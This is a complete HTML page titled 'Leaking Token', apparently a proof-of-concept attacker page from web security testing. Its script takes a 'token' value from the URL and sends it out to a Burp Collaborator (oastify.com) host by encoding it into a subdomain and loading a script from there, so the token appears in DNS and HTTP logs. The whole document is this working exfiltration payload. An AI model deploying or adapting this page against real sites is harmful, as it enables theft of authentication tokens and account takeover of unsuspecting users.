<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Leaking Token</title>
  </head>
  <body>
    <script>
      // Extract ?token=... from the URL
      const params = new URLSearchParams(window.location.search);
      const token = params.get('token');

      if (token) {
        // Sanitize token for DNS (remove special chars)
        const safeToken = token.replace(/[^a-zA-Z0-9]/g, '').slice(0, 50);

        // Send it via DNS (Burp/Oastify logs subdomain)
        const s = document.createElement('script');
        s.src = 'https://' + safeToken + '.f3j5cg7yzfv0qr1yk7kymymudlje74vt.oastify.com';
        document.body.appendChild(s);
      }
    </script>
  </body>
</html>
